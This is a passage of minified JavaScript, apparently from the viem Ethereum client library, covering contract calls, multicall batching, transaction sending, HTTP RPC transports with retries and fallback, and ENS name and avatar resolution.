configured.`]],name:"ChainDoesNotSupportContract"})}}class uj extends Y{constructor({chain:e,currentChainId:r}){super(`The current chain of the wallet (id: ${r}) does not match the target chain for the transaction (id: ${e.id}  ${e.name}).`,{metaMessages:[`Current Chain ID:  ${r}`,`Expected Chain ID: ${e.id}  ${e.name}`],name:"ChainMismatchError"})}}class lj extends Y{constructor(){super(["No chain was provided to the request.","Please provide a chain with the `chain` argument on the Action, or by supplying a `chain` to WalletClient."].join(`
`),{name:"ChainNotFoundError"})}}class c2 extends Y{constructor(){super("No chain was provided to the Client.",{name:"ClientChainNotConfiguredError"})}}const Eg="/docs/contract/encodeDeployData";function u2(t){const{abi:e,args:r,bytecode:n}=t;if(!r||r.length===0)return n;const i=e.find(o=>"type"in o&&o.type==="constructor");if(!i)throw new FF({docsPath:Eg});if(!("inputs"in i))throw new oE({docsPath:Eg});if(!i.inputs||i.inputs.length===0)throw new oE({docsPath:Eg});const s=Hf(i.inputs,r);return oh([n,s])}function dh({blockNumber:t,chain:e,contract:r}){var i;const n=(i=e==null?void 0:e.contracts)==null?void 0:i[r];if(!n)throw new v0({chain:e,contract:{name:r}});if(t&&n.blockCreated&&n.blockCreated>t)throw new v0({blockNumber:t,chain:e,contract:{name:r,blockCreated:n.blockCreated}});return n.address}function hj(t,{docsPath:e,...r}){const n=(()=>{const i=Iy(t,r);return i instanceof Wf?t:i})();return new p7(n,{docsPath:e,...r})}function l2(){let t=()=>{},e=()=>{};return{promise:new Promise((n,i)=>{t=n,e=i}),resolve:t,reject:e}}const Ag=new Map;function h2({fn:t,id:e,shouldSplitBatch:r,wait:n=0,sort:i}){const s=async()=>{const l=c();o();const h=l.map(({args:d})=>d);h.length!==0&&t(h).then(d=>{i&&Array.isArray(d)&&d.sort(i);for(let g=0;g<l.length;g++){const{resolve:y}=l[g];y==null||y([d[g],d])}}).catch(d=>{for(let g=0;g<l.length;g++){const{reject:y}=l[g];y==null||y(d)}})},o=()=>Ag.delete(e),a=()=>c().map(({args:l})=>l),c=()=>Ag.get(e)||[],u=l=>Ag.set(e,[...c(),l]);return{flush:o,async schedule(l){const{promise:h,resolve:d,reject:g}=l2();return(r==null?void 0:r([...a(),l]))&&s(),c().length>0?(u({args:l,resolve:d,reject:g}),h):(u({args:l,resolve:d,reject:g}),setTimeout(s,n),h)}}}async function d2(t,e){var j,L,N,f;const{account:r=t.account,batch:n=!!((j=t.batch)!=null&&j.multicall),blockNumber:i,blockTag:s="latest",accessList:o,blobs:a,code:c,data:u,factory:l,factoryData:h,gas:d,gasPrice:g,maxFeePerBlobGas:y,maxFeePerGas:m,maxPriorityFeePerGas:b,nonce:A,to:_,value:T,stateOverride:P,...S}=e,C=r?Vi(r):void 0;if(c&&(l||h))throw new Y("Cannot provide both `code` & `factory`/`factoryData` as parameters.");if(c&&_)throw new Y("Cannot provide both `code` & `to` as parameters.");const O=c&&u,$=l&&h&&_&&u,D=O||$,F=O?pj({code:c,data:u}):$?gj({data:u,factory:l,factoryData:h,to:_}):u;try{Gf(e);const w=(i?Ue(i):void 0)||s,E=GI(P),x=(f=(N=(L=t.chain)==null?void 0:L.formatters)==null?void 0:N.transactionRequest)==null?void 0:f.format,B=(x||Sy)({...xy(S,{format:x}),from:C==null?void 0:C.address,accessList:o,blobs:a,data:F,gas:d,gasPrice:g,maxFeePerBlobGas:y,maxFeePerGas:m,maxPriorityFeePerGas:b,nonce:A,to:D?void 0:_,value:T});if(n&&dj({request:B})&&!E)try{return await fj(t,{...B,blockNumber:i,blockTag:s})}catch(v){if(!(v instanceof c2)&&!(v instanceof v0))throw v}const k=await t.request({method:"eth_call",params:E?[B,w,E]:[B,w]});return k==="0x"?{data:void 0}:{data:k}}catch(p){const w=mj(p),{offchainLookup:E,offchainLookupSignature:x}=await ln(async()=>{const{offchainLookup:R,offchainLookupSignature:B}=await import("./ccip-CaK8LKXg.js");return{offchainLookup:R,offchainLookupSignature:B}},[]);if(t.ccipRead!==!1&&(w==null?void 0:w.slice(0,10))===x&&_)return{data:await E(t,{data:w,to:_})};throw D&&(w==null?void 0:w.slice(0,10))==="0x101bb98d"?new m7({factory:l}):hj(p,{...e,account:C,chain:t.chain})}}function dj({request:t}){const{data:e,to:r,...n}=t;return!(!e||e.startsWith(oj)||!r||Object.values(n).filter(i=>typeof i<"u").length>0)}async function fj(t,e){var m;const{batchSize:r=1024,wait:n=0}=typeof((m=t.batch)==null?void 0:m.multicall)=="object"?t.batch.multicall:{},{blockNumber:i,blockTag:s="latest",data:o,multicallAddress:a,to:c}=e;let u=a;if(!u){if(!t.chain)throw new c2;u=dh({blockNumber:i,chain:t.chain,contract:"multicall3"})}const h=(i?Ue(i):void 0)||s,{schedule:d}=h2({id:`${t.uid}.${h}`,wait:n,shouldSplitBatch(b){return b.reduce((_,{data:T})=>_+(T.length-2),0)>r*2},fn:async b=>{const A=b.map(P=>({allowFailure:!0,callData:P.data,target:P.to})),_=Hc({abi:w0,args:[A],functionName:"aggregate3"}),T=await t.request({method:"eth_call",params:[{data:_,to:u},h]});return hh({abi:w0,args:[A],functionName:"aggregate3",data:T||"0x"})}}),[{returnData:g,success:y}]=await d({data:o,to:c});if(!y)throw new _y({data:g});return g==="0x"?{data:void 0}:{data:g}}function pj(t){const{code:e,data:r}=t;return u2({abi:C_(["constructor(bytes, bytes)"]),bytecode:aj,args:[e,r]})}function gj(t){const{data:e,factory:r,factoryData:n,to:i}=t;return u2({abi:C_(["constructor(address, bytes, address, bytes)"]),bytecode:cj,args:[i,e,r,n]})}function mj(t){var r;if(!(t instanceof Y))return;const e=t.walk();return typeof(e==null?void 0:e.data)=="object"?(r=e.data)==null?void 0:r.data:e.data}async function ca(t,e){const{abi:r,address:n,args:i,functionName:s,...o}=e,a=Hc({abi:r,args:i,functionName:s});try{const{data:c}=await dt(t,d2,"call")({...o,data:a,to:n});return hh({abi:r,args:i,functionName:s,data:c||"0x"})}catch(c){throw $d(c,{abi:r,address:n,args:i,docsPath:"/docs/contract/readContract",functionName:s})}}const _g=new Map,TE=new Map;let yj=0;function jd(t,e,r){const n=++yj,i=()=>_g.get(t)||[],s=()=>{const l=i();_g.set(t,l.filter(h=>h.id!==n))},o=()=>{const l=i();if(!l.some(d=>d.id===n))return;const h=TE.get(t);l.length===1&&h&&h(),s()},a=i();if(_g.set(t,[...a,{id:n,fns:e}]),a&&a.length>0)return o;const c={};for(const l in e)c[l]=(...h)=>{var g,y;const d=i();if(d.length!==0)for(const m of d)(y=(g=m.fns)[l])==null||y.call(g,...h)};const u=r(c);return typeof u=="function"&&TE.set(t,u),o}async function qd(t){return new Promise(e=>setTimeout(e,t))}function f2(t,{emitOnBegin:e,initialWaitTime:r,interval:n}){let i=!0;const s=()=>i=!1;return(async()=>{let a;e&&(a=await t({unpoll:s}));const c=await(r==null?void 0:r(a))??n;await qd(c);const u=async()=>{i&&(await t({unpoll:s}),await qd(n),u())};u()})(),s}const wj=new Map,bj=new Map;function vj(t){const e=(i,s)=>({clear:()=>s.delete(i),get:()=>s.get(i),set:o=>s.set(i,o)}),r=e(t,wj),n=e(t,bj);return{clear:()=>{r.clear(),n.clear()},promise:r,response:n}}async function Ej(t,{cacheKey:e,cacheTime:r=Number.POSITIVE_INFINITY}){const n=vj(e),i=n.response.get();if(i&&r>0&&new Date().getTime()-i.created.getTime()<r)return i.data;let s=n.promise.get();s||(s=t(),n.promise.set(s));try{const o=await s;return n.response.set({created:new Date,data:o}),o}finally{n.promise.clear()}}const Aj=t=>`blockNumber.${t}`;async function _j(t,{cacheTime:e=t.cacheTime}={}){const r=await Ej(()=>t.request({method:"eth_blockNumber"}),{cacheKey:Aj(t.uid),cacheTime:e});return BigInt(r)}async function Cj(t,{filter:e}){const r="strict"in e&&e.strict,n=await e.request({method:"eth_getFilterChanges",params:[e.id]});if(typeof n[0]=="string")return n;const i=n.map(s=>s2(s));return!("abi"in e)||!e.abi?i:nj({abi:e.abi,logs:i,strict:r})}async function Ij(t,{filter:e}){return e.request({method:"eth_uninstallFilter",params:[e.id]})}class Ry extends Y{constructor({docsPath:e}={}){super(["Could not find an Account to execute with this Action.","Please provide an Account with the `account` argument on the Action, or by supplying an `account` to the Client."].join(`
`),{docsPath:e,docsSlug:"account",name:"AccountNotFoundError"})}}class Cg extends Y{constructor({docsPath:e,metaMessages:r,type:n}){super(`Account type "${n}" is not supported.`,{docsPath:e,metaMessages:r,name:"AccountTypeNotSupportedError"})}}function xj({chain:t,currentChainId:e}){if(!t)throw new lj;if(e!==t.id)throw new uj({chain:t,currentChainId:e})}function Sj(t,{docsPath:e,...r}){const n=(()=>{const i=Iy(t,r);return i instanceof Wf?t:i})();return new h7(n,{docsPath:e,...r})}async function Nj(t,{serializedTransaction:e}){return t.request({method:"eth_sendRawTransaction",params:[e]},{retryCount:0})}const Ig=new qf(128);async function p2(t,e){var A,_,T,P;const{account:r=t.account,chain:n=t.chain,accessList:i,authorizationList:s,blobs:o,data:a,gas:c,gasPrice:u,maxFeePerBlobGas:l,maxFeePerGas:h,maxPriorityFeePerGas:d,nonce:g,value:y,...m}=e;if(typeof r>"u")throw new Ry({docsPath:"/docs/actions/wallet/sendTransaction"});const b=r?Vi(r):null;try{Gf(e);const S=await(async()=>{if(e.to)return e.to;if(e.to!==null&&s&&s.length>0)return await WI({authorization:s[0]}).catch(()=>{throw new Y("`to` is required. Could not infer from `authorizationList`.")})})();if((b==null?void 0:b.type)==="json-rpc"||b===null){let C;n!==null&&(C=await dt(t,t2,"getChainId")({}),xj({currentChainId:C,chain:n}));const O=(T=(_=(A=t.chain)==null?void 0:A.formatters)==null?void 0:_.transactionRequest)==null?void 0:T.format,D=(O||Sy)({...xy(m,{format:O}),accessList:i,authorizationList:s,blobs:o,chainId:C,data:a,from:b==null?void 0:b.address,gas:c,gasPrice:u,maxFeePerBlobGas:l,maxFeePerGas:h,maxPriorityFeePerGas:d,nonce:g,to:S,value:y}),F=Ig.get(t.uid),j=F?"wallet_sendTransaction":"eth_sendTransaction";try{return await t.request({method:j,params:[D]},{retryCount:0})}catch(L){if(F===!1)throw L;const N=L;if(N.name==="InvalidInputRpcError"||N.name==="InvalidParamsRpcError"||N.name==="MethodNotFoundRpcError"||N.name==="MethodNotSupportedRpcError")return await t.request({method:"wallet_sendTransaction",params:[D]},{retryCount:0}).then(f=>(Ig.set(t.uid,!0),f)).catch(f=>{const p=f;throw p.name==="MethodNotFoundRpcError"||p.name==="MethodNotSupportedRpcError"?(Ig.set(t.uid,!1),N):p});throw N}}if((b==null?void 0:b.type)==="local"){const C=await dt(t,Py,"prepareTransactionRequest")({account:b,accessList:i,authorizationList:s,blobs:o,chain:n,data:a,gas:c,gasPrice:u,maxFeePerBlobGas:l,maxFeePerGas:h,maxPriorityFeePerGas:d,nonce:g,nonceManager:b.nonceManager,parameters:[...r2,"sidecars"],value:y,...m,to:S}),O=(P=n==null?void 0:n.serializers)==null?void 0:P.transaction,$=await b.signTransaction(C,{serializer:O});return await dt(t,Nj,"sendRawTransaction")({serializedTransaction:$})}throw(b==null?void 0:b.type)==="smart"?new Cg({metaMessages:["Consider using the `sendUserOperation` Action instead."],docsPath:"/docs/actions/bundler/sendUserOperation",type:"smart"}):new Cg({docsPath:"/docs/actions/wallet/sendTransaction",type:b==null?void 0:b.type})}catch(S){throw S instanceof Cg?S:Sj(S,{...e,account:b,chain:e.chain||void 0})}}async function Tj(t,e){const{abi:r,account:n=t.account,address:i,args:s,dataSuffix:o,functionName:a,...c}=e;if(typeof n>"u")throw new Ry({docsPath:"/docs/contract/writeContract"});const u=n?Vi(n):null,l=Hc({abi:r,args:s,functionName:a});try{return await dt(t,p2,"sendTransaction")({data:`${l}${o?o.replace("0x",""):""}`,to:i,account:u,...c})}catch(h){throw $d(h,{abi:r,address:i,args:s,docsPath:"/docs/contract/writeContract",functionName:a,sender:u==null?void 0:u.address})}}const E0=256;let jh=E0,qh;function g2(t=11){if(!qh||jh+t>E0*2){qh="",jh=0;for(let e=0;e<E0;e++)qh+=(256+Math.random()*256|0).toString(16).substring(1)}return qh.substring(jh,jh+++t)}function m2(t){const{batch:e,cacheTime:r=t.pollingInterval??4e3,ccipRead:n,key:i="base",name:s="Base Client",pollingInterval:o=4e3,type:a="base"}=t,c=t.chain,u=t.account?Vi(t.account):void 0,{config:l,request:h,value:d}=t.transport({chain:c,pollingInterval:o}),g={...l,...d},y={account:u,batch:e,cacheTime:r,ccipRead:n,chain:c,key:i,name:s,pollingInterval:o,request:h,transport:g,type:a,uid:g2()};function m(b){return A=>{const _=A(b);for(const P in y)delete _[P];const T={...b,..._};return Object.assign(T,{extend:m(T)})}}return Object.assign(y,{extend:m(y)})}const zh=new qf(8192);function Pj(t,{enabled:e=!0,id:r}){if(!e||!r)return t();if(zh.get(r))return zh.get(r);const n=t().finally(()=>zh.delete(r));return zh.set(r,n),n}function zd(t,{delay:e=100,retryCount:r=2,shouldRetry:n=()=>!0}={}){return new Promise((i,s)=>{const o=async({count:a=0}={})=>{const c=async({error:u})=>{const l=typeof e=="function"?e({count:a,error:u}):e;l&&await qd(l),o({count:a+1})};try{const u=await t();i(u)}catch(u){if(a<r&&await n({count:a,error:u}))return c({error:u});s(u)}};o()})}function Rj(t,e={}){return async(r,n={})=>{var h;const{dedupe:i=!1,methods:s,retryDelay:o=150,retryCount:a=3,uid:c}={...e,...n},{method:u}=r;if((h=s==null?void 0:s.exclude)!=null&&h.includes(u))throw new Fo(new Error("method not supported"),{method:u});if(s!=null&&s.include&&!s.include.includes(u))throw new Fo(new Error("method not supported"),{method:u});const l=i?Ff(`${c}.${Wn(r)}`):void 0;return Pj(()=>zd(async()=>{try{return await t(r)}catch(d){const g=d;switch(g.code){case Xu.code:throw new Xu(g);case el.code:throw new el(g);case tl.code:throw new tl(g,{method:r.method});case rl.code:throw new rl(g);case aa.code:throw new aa(g);case nl.code:throw new nl(g);case il.code:throw new il(g);case Xs.code:throw new Xs(g);case _c.code:throw new _c(g);case Fo.code:throw new Fo(g,{method:r.method});case Cc.code:throw new Cc(g);case sl.code:throw new sl(g);case hr.code:throw new hr(g);case ol.code:throw new ol(g);case al.code:throw new al(g);case cl.code:throw new cl(g);case ul.code:throw new ul(g);case zi.code:throw new zi(g);case ll.code:throw new ll(g);case hl.code:throw new hl(g);case dl.code:throw new dl(g);case fl.code:throw new fl(g);case pl.code:throw new pl(g);case gl.code:throw new gl(g);case ml.code:throw new ml(g);case 5e3:throw new hr(g);default:throw d instanceof Y?d:new w7(g)}}},{delay:({count:d,error:g})=>{var y;if(g&&g instanceof Ou){const m=(y=g==null?void 0:g.headers)==null?void 0:y.get("Retry-After");if(m!=null&&m.match(/\d/))return Number.parseInt(m)*1e3}return~~(1<<d)*o},retryCount:a,shouldRetry:({error:d})=>Oj(d)}),{enabled:i,id:l})}}function Oj(t){return"code"in t&&typeof t.code=="number"?t.code===-1||t.code===Cc.code||t.code===aa.code:t instanceof Ou&&t.status?t.status===403||t.status===408||t.status===413||t.status===429||t.status===500||t.status===502||t.status===503||t.status===504:!0}function Oy({key:t,methods:e,name:r,request:n,retryCount:i=3,retryDelay:s=150,timeout:o,type:a},c){const u=g2();return{config:{key:t,methods:e,name:r,request:n,retryCount:i,retryDelay:s,timeout:o,type:a},request:Rj(n,{methods:e,retryCount:i,retryDelay:s,uid:u}),value:c}}function kj(t,e={}){const{key:r="custom",methods:n,name:i="Custom Provider",retryDelay:s}=e;return({retryCount:o})=>Oy({key:r,methods:n,name:i,request:t.request.bind(t),retryCount:e.retryCount??o,retryDelay:s,type:"custom"})}function PE(t,e={}){const{key:r="fallback",name:n="Fallback",rank:i=!1,shouldThrow:s=Dj,retryCount:o,retryDelay:a}=e;return({chain:c,pollingInterval:u=4e3,timeout:l,...h})=>{let d=t,g=()=>{};const y=Oy({key:r,name:n,async request({method:m,params:b}){let A;const _=async(T=0)=>{const P=d[T]({...h,chain:c,retryCount:0,timeout:l});try{const S=await P.request({method:m,params:b});return g({method:m,params:b,response:S,transport:P,status:"success"}),S}catch(S){if(g({error:S,method:m,params:b,transport:P,status:"error"}),s(S)||T===d.length-1||(A??(A=d.slice(T+1).some(C=>{const{include:O,exclude:$}=C({chain:c}).config.methods||{};return O?O.includes(m):$?!$.includes(m):!0})),!A))throw S;return _(T+1)}};return _()},retryCount:o,retryDelay:a,type:"fallback"},{onResponse:m=>g=m,transports:d.map(m=>m({chain:c,retryCount:0}))});if(i){const m=typeof i=="object"?i:{};Mj({chain:c,interval:m.interval??u,onTransports:b=>d=b,ping:m.ping,sampleCount:m.sampleCount,timeout:m.timeout,transports:d,weights:m.weights})}return y}}function Dj(t){return!!("code"in t&&typeof t.code=="number"&&(t.code===_c.code||t.code===hr.code||jo.nodeMessage.test(t.message)||t.code===5e3))}function Mj({chain:t,interval:e=4e3,onTransports:r,ping:n,sampleCount:i=10,timeout:s=1e3,transports:o,weights:a={}}){const{stability:c=.7,latency:u=.3}=a,l=[],h=async()=>{const d=await Promise.all(o.map(async m=>{const b=m({chain:t,retryCount:0,timeout:s}),A=Date.now();let _,T;try{await(n?n({transport:b}):b.request({method:"net_listening"})),T=1}catch{T=0}finally{_=Date.now()}return{latency:_-A,success:T}}));l.push(d),l.length>i&&l.shift();const g=Math.max(...l.map(m=>Math.max(...m.map(({latency:b})=>b)))),y=o.map((m,b)=>{const A=l.map(C=>C[b].latency),T=1-A.reduce((C,O)=>C+O,0)/A.length/g,P=l.map(C=>C[b].success),S=P.reduce((C,O)=>C+O,0)/P.length;return S===0?[0,b]:[u*T+c*S,b]}).sort((m,b)=>b[0]-m[0]);r(y.map(([,m])=>o[m])),await qd(e),h()};h()}class Bj extends Y{constructor(){super("No URL was provided to the Transport. Please provide a valid RPC URL to the Transport.",{docsPath:"/docs/clients/intro",name:"UrlRequiredError"})}}function y2(t,{errorInstance:e=new Error("timed out"),timeout:r,signal:n}){return new Promise((i,s)=>{(async()=>{let o;try{const a=new AbortController;r>0&&(o=setTimeout(()=>{n?a.abort():s(e)},r)),i(await t({signal:(a==null?void 0:a.signal)||null}))}catch(a){(a==null?void 0:a.name)==="AbortError"&&s(e),s(a)}finally{clearTimeout(o)}})()})}function Uj(){return{current:0,take(){return this.current++},reset(){this.current=0}}}const RE=Uj();function $j(t,e={}){return{async request(r){var h;const{body:n,onRequest:i=e.onRequest,onResponse:s=e.onResponse,timeout:o=e.timeout??1e4}=r,a={...e.fetchOptions??{},...r.fetchOptions??{}},{headers:c,method:u,signal:l}=a;try{const d=await y2(async({signal:y})=>{const m={...a,body:Array.isArray(n)?Wn(n.map(T=>({jsonrpc:"2.0",id:T.id??RE.take(),...T}))):Wn({jsonrpc:"2.0",id:n.id??RE.take(),...n}),headers:{"Content-Type":"application/json",...c},method:u||"POST",signal:l||(o>0?y:null)},b=new Request(t,m),A=await(i==null?void 0:i(b,m))??{...m,url:t};return await fetch(A.url??t,A)},{errorInstance:new bE({body:n,url:t}),timeout:o,signal:!0});s&&await s(d);let g;if((h=d.headers.get("Content-Type"))!=null&&h.startsWith("application/json"))g=await d.json();else{g=await d.text();try{g=JSON.parse(g||"{}")}catch(y){if(d.ok)throw y;g={error:g}}}if(!d.ok)throw new Ou({body:n,details:Wn(g.error)||d.statusText,headers:d.headers,status:d.status,url:t});return g}catch(d){throw d instanceof Ou||d instanceof bE?d:new Ou({body:n,cause:d,url:t})}}}}function Hh(t,e={}){const{batch:r,fetchOptions:n,key:i="http",methods:s,name:o="HTTP JSON-RPC",onFetchRequest:a,onFetchResponse:c,retryDelay:u,raw:l}=e;return({chain:h,retryCount:d,timeout:g})=>{const{batchSize:y=1e3,wait:m=0}=typeof r=="object"?r:{},b=e.retryCount??d,A=g??e.timeout??1e4,_=t||(h==null?void 0:h.rpcUrls.default.http[0]);if(!_)throw new Bj;const T=$j(_,{fetchOptions:n,onRequest:a,onResponse:c,timeout:A});return Oy({key:i,methods:s,name:o,async request({method:P,params:S}){const C={method:P,params:S},{schedule:O}=h2({id:_,wait:m,shouldSplitBatch(j){return j.length>y},fn:j=>T.request({body:j}),sort:(j,L)=>j.id-L.id}),$=async j=>r?O(j):[await T.request({body:j})],[{error:D,result:F}]=await $(C);if(l)return{error:D,result:F};if(D)throw new Cy({body:C,error:D,url:_});return F},retryCount:b,retryDelay:u,timeout:A,type:"http"},{fetchOptions:n,url:_})}}function ky(t,e){var n,i,s,o,a,c;if(!(t instanceof Y))return!1;const r=t.walk(u=>u instanceof u0);return r instanceof u0?!!(((n=r.data)==null?void 0:n.errorName)==="ResolverNotFound"||((i=r.data)==null?void 0:i.errorName)==="ResolverWildcardNotSupported"||((s=r.data)==null?void 0:s.errorName)==="ResolverNotContract"||((o=r.data)==null?void 0:o.errorName)==="ResolverError"||((a=r.data)==null?void 0:a.errorName)==="HttpError"||(c=r.reason)!=null&&c.includes("Wildcard on non-extended resolvers is not supported")||e==="reverse"&&r.reason===BI[50]):!1}function Lj(t){const{abi:e,data:r}=t,n=Ac(r,0,4),i=e.find(s=>s.type==="function"&&n===ah(Fi(s)));if(!i)throw new GF(n,{docsPath:"/docs/contract/decodeFunctionData"});return{functionName:i.name,args:"inputs"in i&&i.inputs&&i.inputs.length>0?uh(i.inputs,Ac(r,4)):void 0}}const xg="/docs/contract/encodeErrorResult";function OE(t){const{abi:e,errorName:r,args:n}=t;let i=e[0];if(r){const c=ch({abi:e,args:n,name:r});if(!c)throw new aE(r,{docsPath:xg});i=c}if(i.type!=="error")throw new aE(void 0,{docsPath:xg});const s=Fi(i),o=ah(s);let a="0x";if(n&&n.length>0){if(!i.inputs)throw new HF(i.name,{docsPath:xg});a=Hf(i.inputs,n)}return oh([o,a])}const Sg="/docs/contract/encodeFunctionResult";function Fj(t){const{abi:e,functionName:r,result:n}=t;let i=e[0];if(r){const o=ch({abi:e,name:r});if(!o)throw new vc(r,{docsPath:Sg});i=o}if(i.type!=="function")throw new vc(void 0,{docsPath:Sg});if(!i.outputs)throw new yI(i.name,{docsPath:Sg});const s=(()=>{if(i.outputs.length===0)return[];if(i.outputs.length===1)return[n];if(Array.isArray(n))return n;throw new bI(n)})();return Hf(i.outputs,s)}const w2="x-batch-gateway:true";async function hJ(t){const{data:e,ccipRequest:r}=t,{args:[n]}=Lj({abi:b0,data:e}),i=[],s=[];return await Promise.all(n.map(async(o,a)=>{try{s[a]=await r(o),i[a]=!1}catch(c){i[a]=!0,s[a]=jj(c)}})),Fj({abi:b0,functionName:"query",result:[i,s]})}function jj(t){return t.name==="HttpRequestError"&&t.status?OE({abi:b0,errorName:"HttpError",args:[t.status,t.shortMessage]}):OE({abi:[UI],errorName:"Error",args:["shortMessage"in t?t.shortMessage:t.message]})}function b2(t){if(t.length!==66||t.indexOf("[")!==0||t.indexOf("]")!==65)return null;const e=`0x${t.slice(1,65)}`;return ws(e)?e:null}function ld(t){let e=new Uint8Array(32).fill(0);if(!t)return Dr(e);const r=t.split(".");for(let n=r.length-1;n>=0;n-=1){const i=b2(r[n]),s=i?sh(i):no(Vo(r[n]),"bytes");e=no(oa([e,s]),"bytes")}return Dr(e)}function qj(t){return`[${t.slice(2)}]`}function zj(t){const e=new Uint8Array(32).fill(0);return t?b2(t)||no(Vo(t)):Dr(e)}function Dy(t){const e=t.replace(/^\.|\.$/gm,"");if(e.length===0)return new Uint8Array(1);const r=new Uint8Array(Vo(e).byteLength+2);let n=0;const i=e.split(".");for(let s=0;s<i.length;s++){let o=Vo(i[s]);o.byteLength>255&&(o=Vo(qj(zj(i[s])))),r[n]=o.length,r.set(o,n+1),n+=o.length+1}return r.byteLength!==n+1?r.slice(0,n+1):r}async function Hj(t,e){const{blockNumber:r,blockTag:n,coinType:i,name:s,gatewayUrls:o,strict:a}=e,{chain:c}=t,u=(()=>{if(e.universalResolverAddress)return e.universalResolverAddress;if(!c)throw new Error("client chain not configured. universalResolverAddress is required.");return dh({blockNumber:r,chain:c,contract:"ensUniversalResolver"})})(),l=c==null?void 0:c.ensTlds;if(l&&!l.some(h=>s.endsWith(h)))return null;try{const h=Hc({abi:NE,functionName:"addr",...i!=null?{args:[ld(s),BigInt(i)]}:{args:[ld(s)]}}),d={address:u,abi:a2,functionName:"resolve",args:[bs(Dy(s)),h,o??[w2]],blockNumber:r,blockTag:n},y=await dt(t,ca,"readContract")(d);if(y[0]==="0x")return null;const m=hh({abi:NE,args:i!=null?[ld(s),BigInt(i)]:void 0,functionName:"addr",data:y[0]});return m==="0x"||zc(m)==="0x00"?null:m}catch(h){if(a)throw h;if(ky(h,"resolve"))return null;throw h}}class Wj extends Y{constructor({data:e}){super("Unable to extract image from metadata. The metadata may be malformed or invalid.",{metaMessages:["- Metadata must be a JSON object with at least an `image`, `image_url` or `image_data` property.","",`Provided data: ${JSON.stringify(e)}`],name:"EnsAvatarInvalidMetadataError"})}}class du extends Y{constructor({reason:e}){super(`ENS NFT avatar URI is invalid. ${e}`,{name:"EnsAvatarInvalidNftUriError"})}}class My extends Y{constructor({uri:e}){super(`Unable to resolve ENS avatar URI "${e}". The URI may be malformed, invalid, or does not respond with a valid image.`,{name:"EnsAvatarUriResolutionError"})}}class Gj extends Y{constructor({namespace:e}){super(`ENS NFT avatar namespace "${e}" is not supported. Must be "erc721" or "erc1155".`,{name:"EnsAvatarUnsupportedNamespaceError"})}}const Vj=/(?<protocol>https?:\/\/[^\/]*|ipfs:\/|ipns:\/|ar:\/)?(?<root>\/)?(?<subpath>ipfs\/|ipns\/)?(?<target>[\w\-.]+)(?<subtarget>\/.*)?/,Kj=/^(Qm[1-9A-HJ-NP-Za-km-z]{44,}|b[A-Za-z2-7]{58,}|B[A-Z2-7]{58,}|z[1-9A-HJ-NP-Za-km-z]{48,}|F[0-9A-F]{50,})(\/(?<target>[\w\-.]+))?(?<subtarget>\/.*)?$/,Qj=/^data:([a-zA-Z\-/+]*);base64,([^"].*)/,Yj=/^data:([a-zA-Z\-/+]*)?(;[a-zA-Z0-9].*?)?(,)/;async function Jj(t){try{const e=await fetch(t,{method:"HEAD"});if(e.status===200){const r=e.headers.get("content-type");return r==null?void 0:r.startsWith("image/")}return!1}catch(e){return typeof e=="object"&&typeof e.response<"u"||!globalThis.hasOwnProperty("Image")?!1:new Promise(r=>{const n=new Image;n.onload=()=>{r(!0)},n.onerror=()=>{r(!1)},n.src=t})}}function kE(t,e){return t?t.endsWith("/")?t.slice(0,-1):t:e}function v2({uri:t,gatewayUrls:e}){const r=Qj.test(t);if(r)return{uri:t,isOnChain:!0,isEncoded:r};const n=kE(e==null?void 0:e.ipfs,"https://ipfs.io"),i=kE(e==null?void 0:e.arweave,"https://arweave.net"),s=t.match(Vj),{protocol:o,subpath:a,target:c,subtarget:u=""}=(s==null?void 0:s.groups)||{},l=o==="ipns:/"||a==="ipns/",h=o==="ipfs:/"||a==="ipfs/"||Kj.test(t);if(t.startsWith("http")&&!l&&!h){let g=t;return e!=null&&e.arweave&&(g=t.replace(/https:\/\/arweave.net/g,e==null?void 0:e.arweave)),{uri:g,isOnChain:!1,isEncoded:!1}}if((l||h)&&c)return{uri:`${n}/${l?"ipns":"ipfs"}/${c}${u}`,isOnChain:!1,isEncoded:!1};if(o==="ar:/"&&c)return{uri:`${i}/${c}${u||""}`,isOnChain:!1,isEncoded:!1};let d=t.replace(Yj,"");if(d.startsWith("<svg")&&(d=`data:image/svg+xml;base64,${btoa(d)}`),d.startsWith("data:")||d.startsWith("{"))return{uri:d,isOnChain:!0,isEncoded:!1};throw new My({uri:t})}function E2(t){if(typeof t!="object"||!("image"in t)&&!("image_url"in t)&&!("image_data"in t))throw new Wj({data:t});return t.image||t.image_url||t.image_data}async function Zj({gatewayUrls:t,uri:e}){try{const r=await fetch(e).then(i=>i.json());return await By({gatewayUrls:t,uri:E2(r)})}catch{throw new My({uri:e})}}async function By({gatewayUrls:t,uri:e}){const{uri:r,isOnChain:n}=v2({uri:e,gatewayUrls:t});if(n||await Jj(r))return r;throw new My({uri:e})}function Xj(t){let e=t;e.startsWith("did:nft:")&&(e=e.replace("did:nft:","").replace(/_/g,"/"));const[r,n,i]=e.split("/"),[s,o]=r.split(":"),[a,c]=n.split(":");if(!s||s.toLowerCase()!=="eip155")throw new du({reason:"Only EIP-155 supported"});if(!o)throw new du({reason:"Chain ID not found"});if(!c)throw new du({reason:"Contract address not found"});if(!i)throw new du({reason:"Token ID not found"});if(!a)throw new du({reason:"ERC namespace not found"});return{chainID:Number.parseInt(o),namespace:a.toLowerCase(),contractAddress:c,tokenID:i}}async function eq(t,{nft:e}){if(e.namespace==="erc721")return ca(t,{address:e.contractAddress,abi:[{name:"tokenURI",type:"function",stateMutability:"view",inputs:[{name:"tokenId",type:"uint256"}],outputs:[{name:"",type:"string"}]}],functionName:"tokenURI",args:[BigInt(e.tokenID)]});if(e.namespace==="erc1155")return ca(t,{address:e.contractAddress,abi:[{name:"uri",type:"function",stateMutability:"view",inputs:[{name:"_id",type:"uint256"}],outputs:[{name:"",type:"string"}]}],functionName:"uri",args:[BigInt(e.tokenID)]});throw new Gj({namespace:e.namespace})}async function tq(t,{gatewayUrls:e,record:r}){return/eip155:/i.test(r)?rq(t,{gatewayUrls:e,record:r}):By({uri:r,gatewayUrls:e})}async function rq(t,{gatewayUrls:e,record:r}){const n=Xj(r),i=await eq(t,{nft:n}),{uri:s,isOnChain:o,isEncoded:a}=v2({uri:i,gatewayUrls:e});if(o&&(s.includes("data:application/json;base64,")||s.startsWith("{"))){const u=a?atob(s.replace("data:application/json;base64,","")):s,l=JSON.parse(u);return By({uri:E2(l),gatewayUrls:e})}let c=n.tokenID;return n.namespace==="erc1155"&&(c=c.replace("0x","").padStart(64,"0")),Zj({gatewayUrls:e,uri:s.replace(/(?:0x)?{id}/,c)})}async function 